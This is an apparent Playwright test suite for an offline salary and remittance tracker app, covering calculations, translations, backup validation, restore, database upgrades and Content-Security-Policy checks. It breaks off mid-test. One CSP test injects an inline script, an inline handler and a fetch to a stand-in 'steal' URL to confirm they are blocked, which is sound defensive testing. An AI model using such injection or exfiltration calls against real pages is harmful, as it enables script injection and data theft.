/* node run.js <app-folder> [filter]  — exits 1 if any test fails */
const path = require('path'), fs = require('fs'), os = require('os');
const { chromium } = require('playwright');
const H = require('./harness.js');
const { test, tests, assert, eq } = H;
const APP = path.resolve(process.argv[2] || '.'), FILTER = process.argv[3] || '';
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'mst-test-'));
const C = require(path.join(APP, 'calc.js')), I = require(path.join(APP, 'i18n.js'));
const hasRules = fs.existsSync(path.join(APP, 'backup-rules.js'));

const pad = n => String(n).padStart(2, '0');
const NOW = new Date(), MONTH = NOW.getFullYear() + '-' + pad(NOW.getMonth() + 1);
const day = n => MONTH + '-' + pad(n);                    // a date in the month the app opens on
const OLD_MONTH = (() => { const d = new Date(NOW.getFullYear(), NOW.getMonth() - 1, 1); return d.getFullYear() + '-' + pad(d.getMonth() + 1); })();

/* ---------- browser helpers ---------- */
async function seed(page, base, stores, settings, legacy) {      // writes an "old install" (DB version 4 like RC v8) BEFORE the app ever runs
  await page.goto(base + '/manifest.json');
  await page.evaluate(async ([stores, settings, legacy]) => {
    await new Promise((res, rej) => {
      const r = indexedDB.open('salary-tracker-db', 4);
      r.onupgradeneeded = () => { ['work', 'payments', 'expenses', 'remittances', 'gifts', 'workEntries'].forEach(s => r.result.createObjectStore(s, { keyPath: 'id' })); };
      r.onsuccess = () => { const d = r.result, names = ['work', 'payments', 'expenses', 'remittances', 'gifts', 'workEntries'], tx = d.transaction(names, 'readwrite');
        Object.keys(stores || {}).forEach(s => stores[s].forEach(x => tx.objectStore(s).put(x)));
        (legacy || []).forEach(x => tx.objectStore('workEntries').put(x));
        tx.oncomplete = () => { d.close(); res(); }; tx.onerror = () => rej(tx.error); };
      r.onerror = () => rej(r.error);
    });
    if (settings) localStorage.setItem('mst-settings', JSON.stringify(settings));
  }, [stores, settings, legacy]);
}
async function open(page, base) { await page.goto(base + '/'); await page.evaluate(() => window.MSTReady); await page.waitForTimeout(150); }
const data = (page, s) => page.evaluate(s => JSON.parse(JSON.stringify(window.MSTDebug.state.data[s])), s);
async function put(page, store, rec) { await page.evaluate(async ([s, r]) => { const tx = MSTDebug.state.db.transaction(s, 'readwrite'); tx.objectStore(s).put(r); await new Promise((a, b) => { tx.oncomplete = a; tx.onerror = () => b(tx.error); }); }, [store, rec]); }
async function reload(page) { await page.reload(); await page.evaluate(() => window.MSTReady); await page.waitForTimeout(150); }
const validate = (page, obj) => page.evaluate(o => { const r = MSTDebug.validateBackup(o); return { ok: !!r.ok, err: r.error || r.err || null }; }, obj);
async function backupObj(page) { return page.evaluate(() => JSON.parse(JSON.stringify(MSTDebug.buildBackup()))); }
async function download(page, clickSel) { const p = page.waitForEvent('download'); await page.click(clickSel); const d = await p; return fs.readFileSync(await d.path(), 'utf8'); }
function tmpFile(name, obj) { const f = path.join(TMP, name); fs.writeFileSync(f, typeof obj === 'string' ? obj : JSON.stringify(obj)); return f; }
async function restoreUI(page, obj, mode) {      // real UI path: pick file -> safety backup -> merge/replace
  await page.setInputFiles('#file', tmpFile('r' + Math.random() + '.json', obj)); await page.waitForTimeout(150);
  if (!(await page.isVisible('#restoreDlg'))) return { opened: false, toast: await page.textContent('#toast') };
  await download(page, '#rsSafety');
  await page.click(mode === 'replace' ? '#rsReplace' : '#rsMerge');
  if (mode === 'replace') { await page.waitForTimeout(100); if (await page.isVisible('#confirmDlg')) await page.click('#cfOk'); }
  await page.waitForTimeout(400);
  return { opened: true, toast: await page.textContent('#toast'), err: await page.textContent('#rsErr') };
}
const W = (id, date, hours, status) => ({ id, date, status: status || 'worked', hours });

/* ====================== PURE LOGIC (Node) ====================== */
test('calc: 8h = 25.00, 10h = 30.54, 8.5h = 26.39 (default settings)', async () => {
  eq(C.dayParts({ status: 'worked', hours: 8 }).total, 25); eq(C.dayParts({ status: 'worked', hours: 10 }).total, 30.54); eq(C.dayParts({ status: 'worked', hours: 8.5 }).total, 26.39);
}, { node: true });
test('calc: short day pays the full daily wage; rest/unpaid/sick(unpaid by default) pay 0; paid leave & holiday pay 25', async () => {
  eq(C.dayParts({ status: 'worked', hours: 6 }).total, 25); eq(C.dayParts({ status: 'rest' }).total, 0); eq(C.dayParts({ status: 'unpaid_leave' }).total, 0);
  eq(C.dayParts({ status: 'sick_leave' }).total, 0); eq(C.dayParts({ status: 'paid_leave' }).total, 25); eq(C.dayParts({ status: 'holiday' }).total, 25);
}, { node: true });
test('calc: remittance rule unchanged — fee is deducted from amount sent, bonus = 2.5% of the remainder', async () => {
  const q = C.remitParts({ amount: 100, fee: 2, rate: 130, bonus: 2.5 });
  eq(q.net, 98); eq(q.bonusEur, 2.45); eq(q.estimatedBdt, C.r2((98 + 2.45) * 130)); eq(C.r2(q.estimatedBdt), 13058.5);
  eq(C.remitParts({ amount: 100, fee: 2, rate: 130, bonus: 2.5, actualBdt: 13000 }).bdt, 13000);
}, { node: true });
test('calc: month totals — bus allowance never added to earned; rent excluded by default; balance formula unchanged', async () => {
  const d = { work: [{ date: '2026-11-01', status: 'worked', hours: 10 }, { date: '2026-11-02', status: 'worked', hours: 8 }], payments: [{ date: '2026-11-20', month: '2026-11', amount: 100, bus: 50 }],
    expenses: [{ date: '2026-11-03', category: 'rent', amount: 200 }, { date: '2026-11-04', category: 'food', amount: 10 }], remittances: [{ date: '2026-11-05', amount: 100, fee: 2, rate: 130, bonus: 2.5 }], gifts: [{ date: '2026-11-06', amount: 20, currency: 'EUR' }] };
  const m = C.calcMonth(d, {}, '2026-11');
  eq(m.earned, 55.54); eq(m.busDue, 50); eq(m.salaryReceived, 50); eq(m.outstanding, 5.54); eq(m.expenses, 10); eq(m.rentExcluded, 200); eq(m.balance, 100 - 10 - 100 - 20);
}, { node: true });
test('calc: bus allowance Paid/Unpaid status per month (derived from payments; separate from salary)', async () => {
  const st = (work, pay) => C.calcMonth({ work, payments: pay }, {}, '2026-11');
  const w = [{ date: '2026-11-01', status: 'worked', hours: 8 }];
  const a = st(w, []); eq(a.busDue, 50); eq(a.busStatus, 'unpaid'); eq(a.busOutstanding, 50); eq(a.earned, 25);
  const b = st(w, [{ date: '2026-11-10', month: '2026-11', amount: 50, bus: 50 }]); eq(b.busStatus, 'paid'); eq(b.busOutstanding, 0); eq(b.earned, 25); eq(b.outstanding, 25);
  const c = st(w, [{ date: '2026-11-10', month: '2026-11', amount: 30, bus: 20 }]); eq(c.busStatus, 'partial'); eq(c.busOutstanding, 30);
  const d = st([{ date: '2026-11-01', status: 'rest' }], []); eq(d.busDue, 0); eq(d.busStatus, 'notdue'); eq(d.busOutstanding, 0);
  const e = C.calcPeriod({ work: w, payments: [] }, {}, 'year', '2026'); eq(e.total.busOutstanding, 50);
}, { node: true });
test('i18n: all 6 languages have every key, no empty text, same {placeholders} as English', async () => {
  const en = Object.keys(I.T.en), ph = s => (String(s).match(/\{\w+\}/g) || []).sort().join(',');
  eq(I.LANGS, ['en', 'bn', 'tr', 'bg', 'hi', 'el']);
  for (const l of I.LANGS) {
    const miss = en.filter(k => !(k in I.T[l])), extra = Object.keys(I.T[l]).filter(k => !(k in I.T.en)), empty = en.filter(k => !String(I.T[l][k] || '').trim());
    assert(!miss.length && !extra.length && !empty.length, l + ' missing=' + miss.join('|') + ' extra=' + extra.join('|') + ' empty=' + empty.join('|'));
    const badPh = en.filter(k => ph(I.T[l][k]) !== ph(I.T.en[k])); assert(!badPh.length, l + ' placeholder mismatch: ' + badPh.join(','));
  }
}, { node: true });
test('i18n: the new P0 keys exist (storage status, backup banner, update dialog, validation, bus status)', async () => {
  const need = ['st_title', 'st_persist', 'st_persist_yes', 'st_persist_no', 'st_persist_na', 'st_request', 'st_used', 'st_lastBackup', 'st_never', 'b_overdue', 'b_never', 'b_banner_btn', 'b_banner_later',
    'upd_title', 'upd_msg', 'upd_backup', 'upd_reload', 'upd_later', 'bus_line', 'bus_paid', 'bus_partial', 'bus_unpaid', 'bus_notdue', 'r_busStatus', 'r_busOut', 'v_bad_date', 'v_bad_amount', 'v_bad_rate', 'v_bad_bus', 'b_skipped', 'b_dupWarn', 'err_delete'];
  const miss = need.filter(k => !(k in I.T.en)); assert(!miss.length, 'missing keys: ' + miss.join(','));
}, { node: true });

/* ====================== BROWSER: data safety ====================== */
const GOOD = () => ({ stores: { work: [W('w1', day(1), 10)], payments: [{ id: 'p1', date: day(20), month: MONTH, amount: 100, bus: 0 }], expenses: [{ id: 'e1', date: day(2), category: 'food', amount: 5 }], remittances: [{ id: 'r1', date: day(3), recipient: 'A', amount: 50, rate: 130, fee: 1, bonus: 2.5 }], gifts: [{ id: 'g1', date: day(4), person: 'B', currency: 'EUR', amount: 5 }] } });
test('validate: a normal backup, an old RC-v8 style backup, numeric ids, month-only payments and legacy status text are ACCEPTED', async ({ page, base }) => {
  await open(page, base);
  assert((await validate(page, GOOD())).ok, 'normal backup rejected');
  assert((await validate(page, { app: 'x', version: 8, data: GOOD().stores, settings: { basic: 25 } })).ok, 'RC v8 style rejected');
  assert((await validate(page, { stores: { work: [{ id: 5, date: day(1), status: 'Worked', hours: 8 }] } })).ok, 'numeric id / legacy status rejected');
  assert((await validate(page, { stores: { payments: [{ id: 'p', month: MONTH, amount: 10 }] } })).ok, 'month-only payment rejected');
});
const BAD = {
  'negative expense': { expenses: [{ id: 'e', date: day(1), amount: -50 }] },
  'negative payment': { payments: [{ id: 'p', date: day(1), month: MONTH, amount: -1 }] },
  'negative gift': { gifts: [{ id: 'g', date: day(1), person: 'x', amount: -3 }] },
  'negative remittance amount': { remittances: [{ id: 'r', date: day(1), amount: -10, rate: 130 }] },
  'remittance rate 0': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: 0 }] },
  'remittance rate negative': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: -5 }] },
  'remittance rate text': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: 'abc' }] },
  'remittance rate missing': { remittances: [{ id: 'r', date: day(1), amount: 10 }] },
  'remittance fee bigger than amount': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: 130, fee: 11 }] },
  'remittance negative fee': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: 130, fee: -1 }] },
  'remittance negative bonus': { remittances: [{ id: 'r', date: day(1), amount: 10, rate: 130, bonus: -1 }] },
  'bus allowance bigger than payment': { payments: [{ id: 'p', date: day(1), month: MONTH, amount: 10, bus: 99 }] },
  'negative bus allowance': { payments: [{ id: 'p', date: day(1), month: MONTH, amount: 10, bus: -1 }] },
  'amount missing': { expenses: [{ id: 'e', date: day(1) }] },
  'amount null': { expenses: [{ id: 'e', date: day(1), amount: null }] },
  'amount empty text': { expenses: [{ id: 'e', date: day(1), amount: '' }] },
  'amount not a number': { expenses: [{ id: 'e', date: day(1), amount: 'abc' }] },
  'invalid date (31 Feb)': { expenses: [{ id: 'e', date: '2026-02-31', amount: 1 }] },
  'payment with bad month text': { payments: [{ id: 'p', date: day(1), month: '2026-13', amount: 1 }] },
  'record without id': { expenses: [{ date: day(1), amount: 1 }] },
  'duplicate id inside a list': { expenses: [{ id: 'e', date: day(1), amount: 1 }, { id: 'e', date: day(2), amount: 2 }] },
  'work hours 25': { work: [{ id: 'w', date: day(1), status: 'worked', hours: 25 }] },
  'work hours negative': { work: [{ id: 'w', date: day(1), status: 'worked', hours: -1 }] },
  'work status missing': { work: [{ id: 'w', date: day(1), hours: 8 }] },
  'list is not an array': { expenses: { a: 1 } },
  'record is not an object': { expenses: ['x'] },
  'backup with zero records': { work: [], payments: [] },
};
for (const [name, stores] of Object.entries(BAD)) test('validate: REJECTS ' + name, async ({ page, base }) => { await open(page, base); eq((await validate(page, { stores })).ok, false, 'accepted a bad backup'); });
test('validate: REJECTS a negative setting, standard hours > 24, and non-objects', async ({ page, base }) => {
  await open(page, base);
  eq((await validate(page, { stores: GOOD().stores, settings: { basic: -1 } })).ok, false); eq((await validate(page, { stores: GOOD().stores, settings: { standard: 30 } })).ok, false);
  eq((await validate(page, null)).ok, false); eq((await validate(page, [])).ok, false); eq((await validate(page, {})).ok, false);
});

test('delete: works for string ids (list button, with confirmation)', async ({ page, base }) => {
  await seed(page, base, { expenses: [{ id: 'a', date: day(1), category: 'food', amount: 1 }, { id: 'b', date: day(2), category: 'food', amount: 2 }] }); await open(page, base);
  await page.click('#expenseList [data-delete=expenses][data-id=a]'); await page.click('#cfOk'); await page.waitForTimeout(250);
  eq((await data(page, 'expenses')).map(x => x.id), ['b']);
});
test('delete: works for NUMERIC ids (list button) and leaves other records alone', async ({ page, base }) => {
  await seed(page, base, { expenses: [{ id: 7, date: day(1), category: 'food', amount: 1 }, { id: 'b', date: day(2), category: 'food', amount: 2 }] }); await open(page, base);
  await page.click('#expenseList [data-delete=expenses][data-id="7"]'); await page.click('#cfOk'); await page.waitForTimeout(250);
  eq((await data(page, 'expenses')).map(x => x.id), ['b'], 'numeric-id record was not deleted');
  eq(await page.$$eval('#expenseList .entry', e => e.length), 1);
});
test('delete: works for numeric ids from the edit dialog; cancelling the confirmation deletes nothing', async ({ page, base }) => {
  await seed(page, base, { gifts: [{ id: 12, date: day(1), person: 'P', currency: 'EUR', amount: 4 }] }); await open(page, base);
  await page.click('#giftList [data-delete=gifts]'); await page.click('#cfCancel'); await page.waitForTimeout(200); eq((await data(page, 'gifts')).length, 1, 'cancel still deleted');
  await page.click('#giftList [data-edit=gifts]'); await page.click('#deleteBtn'); await page.click('#cfOk'); await page.waitForTimeout(250); eq((await data(page, 'gifts')).length, 0);
});
test('delete: every record type can be deleted (work, payment, expense, remittance, gift)', async ({ page, base }) => {
  const g = GOOD().stores; await seed(page, base, g); await open(page, base);
  for (const [sel, kind, id] of [['#workList', 'work', 'w1'], ['#paymentList', 'payments', 'p1'], ['#expenseList', 'expenses', 'e1'], ['#remitList', 'remittances', 'r1'], ['#giftList', 'gifts', 'g1']]) {
    await page.click(`${sel} [data-delete=${kind}][data-id=${id}]`); await page.click('#cfOk'); await page.waitForTimeout(250); eq((await data(page, kind)).length, 0, kind);
  }
});

test('restore/merge: same date + different id is NOT duplicated; existing record kept; skipped count shown', async ({ page, base }) => {
  await seed(page, base, { work: [W('keep', day(10), 8)] }); await open(page, base);
  const bk = { stores: { work: [W('other', day(10), 12), W('new1', day(11), 8)] } };
  const r = await restoreUI(page, bk, 'merge');
  const w = await data(page, 'work'); eq(w.filter(x => x.date === day(10)).length, 1, 'two records on one date'); eq(w.find(x => x.date === day(10)).id, 'keep', 'existing record was overwritten'); eq(w.find(x => x.date === day(10)).hours, 8);
  assert(w.some(x => x.id === 'new1'), 'non-conflicting record was not added'); assert(/1/.test(r.toast), 'skipped count not shown: ' + r.toast);
});
test('restore/merge: same id updates in place; two records for one date INSIDE the backup keep only the first', async ({ page, base }) => {
  await seed(page, base, { work: [W('a', day(5), 8)] }); await open(page, base);
  await restoreUI(page, { stores: { work: [W('a', day(5), 10), W('x1', day(6), 8), W('x2', day(6), 9)] } }, 'merge');
  const w = await data(page, 'work'); eq(w.find(x => x.id === 'a').hours, 10, 'same-id record was not updated'); eq(w.filter(x => x.date === day(6)).length, 1, 'duplicates from inside the file were imported'); eq(w.length, 2);
});
test('restore/merge: non-work stores merge by id and never lose existing records', async ({ page, base }) => {
  const g = GOOD().stores; await seed(page, base, g); await open(page, base);
  await restoreUI(page, { stores: { expenses: [{ id: 'e2', date: day(9), category: 'food', amount: 7 }], gifts: [{ id: 'g1', date: day(4), person: 'B2', currency: 'EUR', amount: 6 }] } }, 'merge');
  eq((await data(page, 'expenses')).map(x => x.id).sort(), ['e1', 'e2']); eq((await data(page, 'gifts'))[0].person, 'B2'); eq((await data(page, 'work')).length, 1); eq((await data(page, 'remittances')).length, 1);
});
test('restore/replace: replaces everything with the backup; safety backup step is required first', async ({ page, base }) => {
  await seed(page, base, { work: [W('old', day(1), 8)], expenses: [{ id: 'oldE', date: day(2), category: 'food', amount: 1 }] }); await open(page, base);
  await page.setInputFiles('#file', tmpFile('rep.json', { stores: { work: [W('n', day(3), 9)] } })); await page.waitForTimeout(150);
  assert(await page.isDisabled('#rsMerge') && await page.isDisabled('#rsReplace'), 'restore buttons enabled before safety backup');
  await download(page, '#rsSafety'); await page.click('#rsReplace'); await page.click('#cfOk'); await page.waitForTimeout(400);
  eq((await data(page, 'work')).map(x => x.id), ['n']); eq((await data(page, 'expenses')).length, 0);
});
test('restore: a bad file changes NOTHING and opens no restore dialog', async ({ page, base }) => {
  const g = GOOD().stores; await seed(page, base, g); await open(page, base);
  const bad = GOOD(); bad.stores.remittances[0].rate = 0;
  const r = await restoreUI(page, bad, 'replace'); eq(r.opened, false, 'restore dialog opened for a bad file');
  eq((await data(page, 'remittances')).length, 1); eq((await data(page, 'work')).length, 1);
  await page.setInputFiles('#file', tmpFile('junk.json', 'this is not json {')); await page.waitForTimeout(150); eq(await page.isVisible('#restoreDlg'), false);
});
test('restore: if the database write FAILS half-way, the previous data is intact (all-or-nothing)', async ({ page, base }) => {
  const g = GOOD().stores; await seed(page, base, g); await open(page, base);
  await page.evaluate(() => { const orig = IDBObjectStore.prototype.put; let n = 0; IDBObjectStore.prototype.put = function () { if (++n === 3) throw new Error('simulated disk failure'); return orig.apply(this, arguments); }; });
  const r = await restoreUI(page, { stores: { work: [W('n1', day(3), 9), W('n2', day(4), 9), W('n3', day(5), 9)], expenses: [{ id: 'n4', date: day(6), category: 'food', amount: 3 }] } }, 'replace');
  await page.evaluate(() => { location.reload; }); await reload(page);
  eq((await data(page, 'work')).map(x => x.id), ['w1'], 'old work records damaged'); eq((await data(page, 'expenses')).map(x => x.id), ['e1']); eq((await data(page, 'gifts')).length, 1);
  assert(/\S/.test(r.err || r.toast), 'no error shown to the user');
});
test('upgrade: an old DB (version 4 with legacy store + text status) opens without losing or altering a single record', async ({ page, base }) => {
  const stores = { work: [{ id: 'w1', date: day(3), status: 'worked', hours: 10 }, { id: 'w2', date: day(4), status: 'Worked', hours: 8 }], payments: [{ id: 'p1', date: day(20), month: MONTH, amount: 100, bus: 0 }], remittances: [{ id: 'r1', date: day(10), recipient: 'Mum', amount: 100, rate: 130, fee: 2, bonus: 2.5 }] };
  await seed(page, base, stores, { basic: 25, standard: 8, otRate: 2.77, bus: 50, bonus: 2.5, language: 'en' }, [{ id: 'old1', date: OLD_MONTH + '-01', status: 'worked', hours: 8 }]);
  await open(page, base);
  const w = await data(page, 'work'); eq(w.length, 3, 'legacy record not migrated'); eq(w.find(x => x.id === 'w1'), stores.work[0]); eq((await data(page, 'payments'))[0], stores.payments[0]); eq((await data(page, 'remittances'))[0], stores.remittances[0]);
  eq(await page.evaluate(() => indexedDB.databases().then(l => l.find(d => d.name === 'salary-tracker-db').version)), 4, 'database version was changed unnecessarily');
  assert(/55[.,]54/.test(await page.textContent('#earned')), 'earned total wrong: ' + await page.textContent('#earned'));
});

/* ====================== BROWSER: storage, backup, update ====================== */
const stubStorage = (mode) => `(() => { const m = ${JSON.stringify(mode)}; if (m === 'none') { try { Object.defineProperty(navigator, 'storage', { value: undefined, configurable: true }); } catch (e) {} return; }
  let persisted = false; window.__persistCalls = 0;
  const s = { persisted: async () => persisted, persist: async () => { window.__persistCalls++; persisted = (m === 'granted'); return persisted; }, estimate: async () => ({ usage: 3 * 1024 * 1024, quota: 2 * 1024 * 1024 * 1024 }) };
  try { Object.defineProperty(navigator, 'storage', { value: s, configurable: true }); } catch (e) {} })();`;
test('storage: asks the browser for persistent storage at start-up; Settings shows "Protected" when granted', async ({ ctx, page, base }) => {
  await ctx.addInitScript(stubStorage('granted')); await open(page, base); await page.waitForTimeout(300);
  assert((await page.evaluate(() => window.__persistCalls)) >= 1, 'persist() was never called'); const t = await page.textContent('#storageBox');
  assert(t.includes(I.T.en.st_persist_yes), 'status text missing: ' + t); assert(/3(\.0)? ?MB/i.test(t), 'usage not shown: ' + t);
});
test('storage: Settings says "Not guaranteed" when the browser refuses, and the button asks again', async ({ ctx, page, base }) => {
  await ctx.addInitScript(stubStorage('denied')); await open(page, base); await page.waitForTimeout(300);
  assert((await page.textContent('#storageBox')).includes(I.T.en.st_persist_no)); const before = await page.evaluate(() => window.__persistCalls);
  await page.click('#persistBtn'); await page.waitForTimeout(300); assert((await page.evaluate(() => window.__persistCalls)) > before, 'button did not ask again'); assert((await page.textContent('#storageBox')).includes(I.T.en.st_persist_no));
});
test('storage: a browser without the storage API shows "not supported" and the app still works', async ({ ctx, page, base }) => {
  await ctx.addInitScript(stubStorage('none')); await open(page, base); assert((await page.textContent('#storageBox')).includes(I.T.en.st_persist_na)); eq(await page.isVisible('#persistBtn'), false);
  await page.click('#addExpense'); await page.fill('[name=amount]', '3'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(250); eq((await data(page, 'expenses')).length, 1);
});
test('last backup: shows "Never"; Export backup records the date; the backup FILE format is unchanged', async ({ page, base }) => {
  await seed(page, base, GOOD().stores); await open(page, base);
  assert((await page.textContent('#storageBox')).includes(I.T.en.st_never), 'Never missing'); eq(await page.evaluate(() => localStorage.getItem('mst-last-backup')), null);
  const txt = await download(page, '#backup'); await page.waitForTimeout(250); const j = JSON.parse(txt);
  const stored = await page.evaluate(() => localStorage.getItem('mst-last-backup')); assert(stored && !isNaN(Date.parse(stored)), 'last backup date not saved: ' + stored);
  assert(!(await page.textContent('#storageBox')).includes(I.T.en.st_never), 'still says Never'); eq(Object.keys(j).sort(), ['app', 'exportedAt', 'format', 'settings', 'stores', 'version']); eq(Object.keys(j.stores).sort(), ['expenses', 'gifts', 'payments', 'remittances', 'work']);
  assert(!JSON.stringify(j.settings).includes('last'), 'last-backup date leaked into backup settings');
});
test('last backup: cancelling the share/save does NOT mark a backup as done', async ({ ctx, page, base }) => {
  await ctx.addInitScript(`(() => { navigator.canShare = () => true; navigator.share = async () => { const e = new Error('cancelled'); e.name = 'AbortError'; throw e; }; })();`);
  await seed(page, base, GOOD().stores); await open(page, base); await page.click('#backup'); await page.waitForTimeout(300);
  eq(await page.evaluate(() => localStorage.getItem('mst-last-backup')), null);
});
async function setLast(page, daysAgo) { await page.evaluate(d => localStorage.setItem('mst-last-backup', new Date(Date.now() - d * 864e5).toISOString()), daysAgo); }
test('banner: records exist + never backed up -> warning shown; "Export backup now" works and hides it', async ({ page, base }) => {
  await seed(page, base, GOOD().stores); await open(page, base); eq(await page.isVisible('#backupBanner'), true, 'banner missing');
  assert((await page.textContent('#backupBanner')).includes(I.T.en.b_never.slice(0, 20)));
  await download(page, '#bannerExport'); await page.waitForTimeout(250); eq(await page.isVisible('#backupBanner'), false);
});
test('banner: last backup 8 days ago -> shown (with the date); 6 days ago -> hidden', async ({ page, base }) => {
  await seed(page, base, GOOD().stores); await open(page, base); await setLast(page, 8); await reload(page); eq(await page.isVisible('#backupBanner'), true, '8 days: not shown');
  await setLast(page, 6); await reload(page); eq(await page.isVisible('#backupBanner'), false, '6 days: shown');
});
test('banner: no records -> no banner; "remind me tomorrow" hides it for today but it returns the next day', async ({ page, base }) => {
  await open(page, base); eq(await page.isVisible('#backupBanner'), false, 'banner on empty app');
  await put(page, 'expenses', { id: 'z', date: day(1), category: 'food', amount: 1 }); await reload(page); eq(await page.isVisible('#backupBanner'), true);
  await page.click('#bannerLater'); eq(await page.isVisible('#backupBanner'), false); await reload(page); eq(await page.isVisible('#backupBanner'), false, 'snooze ignored');
  await page.evaluate(() => localStorage.setItem('mst-backup-snooze', '2000-01-01')); await reload(page); eq(await page.isVisible('#backupBanner'), true, 'did not come back');
});
test('update: when a new version is installed, the app offers "Export backup first" before "Reload now"', async ({ page, base, srv }) => {
  await open(page, base); await page.waitForFunction(() => navigator.serviceWorker.getRegistration().then(r => r && r.active)); await page.waitForTimeout(500);
  await put(page, 'expenses', { id: 'z', date: day(1), category: 'food', amount: 1 });
  srv.ctl.swSuffix = '// new build ' + Date.now(); await page.evaluate(() => navigator.serviceWorker.getRegistration().then(r => r.update()));
  await page.waitForSelector('#updateDlg[open]', { timeout: 10000 });
  const txt = await download(page, '#updBackup'); assert(JSON.parse(txt).stores.expenses.length === 1, 'backup from update dialog is incomplete');
  await page.waitForTimeout(250); assert(await page.evaluate(() => !!localStorage.getItem('mst-last-backup')), 'update-backup not recorded');
  await page.click('#updLater'); eq(await page.isVisible('#updateDlg'), false); eq((await data(page, 'expenses')).length, 1);
});

/* ====================== BROWSER: security, language, bus status, regression ====================== */
test('CSP: index.html and recover.html both carry a strict Content-Security-Policy (no external hosts, no inline scripts)', async ({ page, base }) => {
  for (const f of ['index.html', 'recover.html']) {
    const html = fs.readFileSync(path.join(APP, f), 'utf8'); const m = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/); assert(m, f + ' has no CSP');
    const csp = m[1]; assert(/default-src 'self'/.test(csp) && /script-src 'self'/.test(csp) && /object-src 'none'/.test(csp) && /connect-src 'self'/.test(csp), f + ' CSP too weak: ' + csp);
    assert(!/script-src[^;]*unsafe-/.test(csp), f + ' allows unsafe scripts'); assert(!/https?:\/\//.test(csp), f + ' CSP names an external host');
    assert(!/<script(?![^>]*\bsrc=)[^>]*>/i.test(html), f + ' still has an inline <script>'); assert(!/\son(click|load|error)=/i.test(html), f + ' has inline event handlers');
  }
});
test('CSP: injected inline script / inline handler / outside connection are blocked, and normal use triggers NO violations', async ({ page, base }) => {
  const viol = []; await page.exposeFunction('__viol', v => viol.push(v)); await page.addInitScript(() => document.addEventListener('securitypolicyviolation', e => window.__viol(e.violatedDirective)));
  await seed(page, base, GOOD().stores); await open(page, base);
  await page.click('#addExpense'); await page.fill('[name=amount]', '3'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200);
  await page.click('#menuBtn'); await page.click('#menu .closeDlg'); for (const id of ['rYear', 'rAll', 'rMonth']) await page.click('#' + id);
  await download(page, '#backup'); await page.selectOption('#language', 'el'); await page.selectOption('#theme', 'dark'); await page.waitForTimeout(300);
  eq(viol, [], 'the app itself violates its own CSP: ' + viol.join(','));
  await page.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__pwn=1'; document.body.appendChild(s); const b = document.createElement('button'); b.setAttribute('onclick', 'window.__pwn2=1'); document.body.appendChild(b); b.click(); fetch('https://example.com/steal').catch(() => {}); });
  await page.waitForTimeout(400); eq(await page.evaluate(() => [window.__pwn, window.__pwn2]), [undefined, undefined], 'injected code ran'); assert(viol.length >= 3, 'expected >=3 blocked things, saw ' + viol.join(','));
});
test('CSP: recover.html still works under the new policy (finds the saved records, offers the file)', async ({ page, base }) => {
  await seed(page, base, GOOD().stores); await page.goto(base + '/recover.html'); await page.waitForSelector('#actions:not([hidden])', { timeout: 8000 });
  assert(/Records found: 5/.test(await page.textContent('#status')), await page.textContent('#status')); assert((await page.inputValue('#out')).includes('"w1"'));
});
test('language: an error message and a toast that are already on screen switch to the new language immediately', async ({ page, base }) => {
  await open(page, base);
  await page.fill('#basic', '-1'); await page.click('#saveSettings'); eq(await page.textContent('#settingsMsg'), I.T.en.err_settings);
  await page.selectOption('#language', 'el'); eq(await page.textContent('#settingsMsg'), I.T.el.err_settings, 'settings error stayed English');
  await page.setInputFiles('#file', tmpFile('junk2.json', 'not json')); await page.waitForTimeout(200); assert((await page.textContent('#toast')).includes(I.T.el.b_invalid), 'toast not Greek: ' + await page.textContent('#toast'));
  await page.selectOption('#language', 'tr'); assert((await page.textContent('#toast')).includes(I.T.tr.b_invalid), 'toast did not follow language change: ' + await page.textContent('#toast'));
});
test('language: form validation error and restore error also follow the language', async ({ page, base }) => {
  await open(page, base); await page.click('#addExpense'); await page.fill('[name=amount]', '-5'); await page.click('#editForm button[type=submit]'); eq(await page.textContent('#formErr'), I.T.en.err_amount);
  await page.evaluate(() => { const l = document.getElementById('language'); l.value = 'bg'; l.dispatchEvent(new Event('change')); }); eq(await page.textContent('#formErr'), I.T.bg.err_amount);
});
test('bus allowance status shows on screen and in the report; earned total never includes it', async ({ page, base }) => {
  await seed(page, base, { work: [W('w1', day(1), 8)] }); await open(page, base);
  assert((await page.textContent('#busLine')).includes(I.T.en.bus_unpaid), 'unpaid not shown: ' + await page.textContent('#busLine')); assert(/25[.,]00/.test(await page.textContent('#earned')));
  await put(page, 'payments', { id: 'p', date: day(5), month: MONTH, amount: 50, bus: 50 }); await reload(page);
  assert((await page.textContent('#busLine')).includes(I.T.en.bus_paid)); assert(/25[.,]00/.test(await page.textContent('#earned'))); assert((await page.textContent('#reportBody')).includes(I.T.en.r_busStatus));
});
test('regression: add/edit for all record types, validation messages, duplicate work date blocked', async ({ page, base }) => {
  await open(page, base);
  await page.click('#addExpense'); await page.fill('[name=amount]', '12.5'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200);
  await page.click('#addGift'); await page.fill('[name=person]', 'F'); await page.fill('[name=amount]', '500'); await page.selectOption('[name=currency]', 'BDT'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200);
  await page.click('#addRemit'); await page.fill('[name=recipient]', 'D'); await page.fill('[name=amount]', '50'); await page.fill('[name=rate]', '131'); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200);
  await page.click('#addPayment'); await page.fill('[name=amount]', '-5'); await page.click('#editForm button[type=submit]'); assert((await page.textContent('#formErr')).length > 0); await page.click('#editDialog .closeDlg');
  await page.click('#addWork'); await page.fill('[name=date]', day(3)); await page.click('#editForm button[type=submit]'); await page.waitForTimeout(200);
  await page.click('#addWork'); await page.fill('[name=date]', day(3)); await page.click('#editForm button[type=submit]'); assert((await page.textContent('#formErr')).length > 0, 'duplicate work date allowed'); await page.click('#editDialog .closeDlg');
  eq([(await data(page, 'expenses')).length, (await data(page, 'gifts')).length, (await data(page, 'remittances')).length, (await data(page, 'work')).length], [1, 1, 1, 1]);
